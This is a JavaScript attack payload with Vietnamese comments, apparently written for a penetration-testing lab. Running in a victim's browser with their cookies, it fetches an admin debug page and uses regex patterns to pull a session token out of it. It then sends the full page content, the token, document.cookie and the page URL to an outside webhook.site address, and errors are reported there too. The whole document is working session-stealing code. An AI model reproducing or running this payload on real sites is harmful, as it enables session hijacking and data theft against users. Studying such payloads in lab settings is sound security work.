// Bước 1: Fetch trang debug - chấp nhận mọi status code
fetch('https://lab1.demo-pentest.pp.ua/admin/debug', {
    method: 'GET',
    credentials: 'include',  // Gửi kèm cookie session
})
.then(response => {
    // KHÔNG kiểm tra response.ok - chấp nhận cả 500
    console.log('Status nhận được:', response.status);
    
    // Vẫn lấy response body dù status là gì
    return response.text();  // Lấy nội dung trang dưới dạng text
})
.then(htmlContent => {
    console.log('Đã nhận được response content, đang tìm session...');
    
    // Bước 2: Tìm giá trị lab1_session trong response
    // Thử với nhiều pattern khác nhau
    
    let sessionValue = null;
    
    // Pattern 1: lab1_session = "value"
    const pattern1 = /lab1_session\s*=\s*["']([^"']+)["']/i;
    const match1 = htmlContent.match(pattern1);
    
    // Pattern 2: lab1_session: value  
    const pattern2 = /lab1_session[:\s]+([a-f0-9]{32,})/i;
    const match2 = htmlContent.match(pattern2);
    
    // Pattern 3: Tìm bất kỳ chuỗi 32 ký tự hex (thường là session)
    const pattern3 = /[a-f0-9]{32}/i;
    const match3 = htmlContent.match(pattern3);
    
    if (match1 && match1[1]) {
        sessionValue = match1[1];
        console.log('Tìm thấy pattern 1:', sessionValue);
    } else if (match2 && match2[1]) {
        sessionValue = match2[1];
        console.log('Tìm thấy pattern 2:', sessionValue);
    } else if (match3) {
        sessionValue = match3[0];
        console.log('Tìm thấy pattern 3 (session hash):', sessionValue);
    } else {
        console.log('Không tìm thấy session với các pattern có sẵn');
        // Log một phần content để debug
        console.log('Content preview:', htmlContent.substring(0, 200));
    }
    
    // Bước 3: Gửi toàn bộ response về webhook để phân tích
    const webhookUrl = 'https://webhook.site/35072877-3640-41da-b949-6eb069d6e53c';
    
    // Dữ liệu gửi đi
    const dataToSend = {
        url: window.location.href,
        status: '500 (debug page)',
        session_found: sessionValue,
        full_response: htmlContent,  // Gửi cả response để analyze
        cookies: document.cookie,    // Cookie không HttpOnly (nếu có)
        timestamp: new Date().toISOString()
    };
    
    // Gửi về webhook
    fetch(webhookUrl, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(dataToSend)
    })
    .then(() => console.log('Đã gửi dữ liệu về webhook thành công'))
    .catch(err => console.error('Lỗi gửi webhook:', err));
    
})
.catch(error => {
    // Chỉ bắt lỗi network, không phải lỗi HTTP status
    console.error('Lỗi network:', error);
    
    // Báo lỗi về webhook
    fetch('https://webhook.site/35072877-3640-41da-b949-6eb069d6e53c', {
        method: 'POST',
        mode: 'no-cors', 
        body: JSON.stringify({
            error: error.toString(),
            url: window.location.href
        })
    });
});
